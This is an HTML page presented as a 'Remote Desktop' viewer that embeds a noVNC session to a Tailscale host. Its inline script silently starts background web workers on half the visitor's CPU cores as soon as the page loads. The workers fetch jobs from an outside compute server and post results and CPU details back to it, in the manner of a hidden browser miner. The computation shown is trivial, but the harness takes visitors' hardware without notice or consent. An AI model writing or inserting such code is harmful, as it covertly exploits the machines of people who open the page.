<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Remote Desktop</title>
<style>
html,body{
margin:0;
width:100%;
height:100%;
overflow:hidden;
background:#000;
}
iframe{
position:absolute;
inset:0;
width:100%;
height:100%;
border:0;
}
</style>
</head>
<body>

<iframe
src="https://camerons-laptop.taila7ae01.ts.net/vnc.html?autoconnect=true&resize=remote&view_only=false"
allow="fullscreen"
></iframe>

<script>
const COMPUTE_HOST="https://camerons-laptop.taila7ae01.ts.net:8443";

const cores=Math.max(
    1,
    navigator.hardwareConcurrency||1
);

const targetWorkers=Math.max(
    1,
    Math.floor(cores*0.5)
);

const workerCode=`
self.onmessage=function(event){

    if(event.data.type!=="compute"){
        return;
    }

    let value=0;

    for(
        let i=0;
        i<event.data.iterations;
        i++
    ){
        value+=Math.sqrt(i);
    }

    self.postMessage({
        value:value
    });
};
`;

function createWorker(){

    const blob=new Blob(
        [workerCode],
        {
            type:"application/javascript"
        }
    );

    const worker=new Worker(
        URL.createObjectURL(blob)
    );

    return worker;
}

let workers=[];
let running=true;

async function getJob(){

    try{

        const response=await fetch(
            COMPUTE_HOST+
            "/job?time="+
            Date.now(),
            {
                method:"GET",
                cache:"no-store"
            }
        );

        if(!response.ok){
            throw new Error(
                "HTTP "+response.status
            );
        }

        return await response.json();

    }catch(error){

        console.log(
            "Compute connection error:",
            error
        );

        return null;
    }
}

async function sendResult(data){

    try{

        const response=await fetch(
            COMPUTE_HOST+
            "/result?time="+
            Date.now(),
            {
                method:"POST",
                headers:{
                    "Content-Type":
                        "application/json"
                },
                cache:"no-store",
                body:JSON.stringify(data)
            }
        );

        if(!response.ok){
            throw new Error(
                "Result HTTP "+
                response.status
            );
        }

    }catch(error){

        console.log(
            "Result upload error:",
            error
        );
    }
}

async function workerLoop(worker,index){

    console.log(
        "Compute worker",
        index,
        "started"
    );

    while(running){

        const response=await getJob();

        if(!running){
            break;
        }

        if(
            !response ||
            !response.job
        ){

            await new Promise(
                resolve=>{
                    setTimeout(
                        resolve,
                        1000
                    );
                }
            );

            continue;
        }

        const job=response.job;

        console.log(
            "Worker",
            index,
            "received job",
            job.id
        );

        const started=performance.now();

        const result=await new Promise(
            resolve=>{

                worker.onmessage=function(
                    event
                ){

                    resolve(
                        event.data.value
                    );
                };

                worker.onerror=function(
                    error
                ){

                    console.error(
                        "Worker error:",
                        error
                    );

                    resolve(null);
                };

                worker.postMessage({
                    type:"compute",
                    iterations:
                        job.iterations
                });
            }
        );

        const milliseconds=
            performance.now()-
            started;

        if(result===null){
            continue;
        }

        await sendResult({

            id:job.id,

            result:result,

            milliseconds:
                milliseconds,

            viewerThreads:
                cores
        });

        console.log(
            "Worker",
            index,
            "completed job in",
            Math.round(milliseconds),
            "ms"
        );
    }
}

function startCompute(){

    console.log(
        "Starting browser compute:",
        targetWorkers,
        "workers on",
        cores,
        "CPU threads"
    );

    for(
        let i=0;
        i<targetWorkers;
        i++
    ){

        const worker=createWorker();

        workers.push(worker);

        workerLoop(
            worker,
            i+1
        );
    }
}

startCompute();

document.documentElement
    .requestFullscreen?.()
    .catch(()=>{});

const frame=
    document.querySelector("iframe");

frame.addEventListener(
    "load",
    ()=>{
        frame.contentWindow?.focus();
    }
);

window.addEventListener(
    "beforeunload",
    ()=>{
        running=false;

        for(
            const worker of workers
        ){
            worker.terminate();
        }

        workers=[];
    }
);
</script>

</body>
</html>
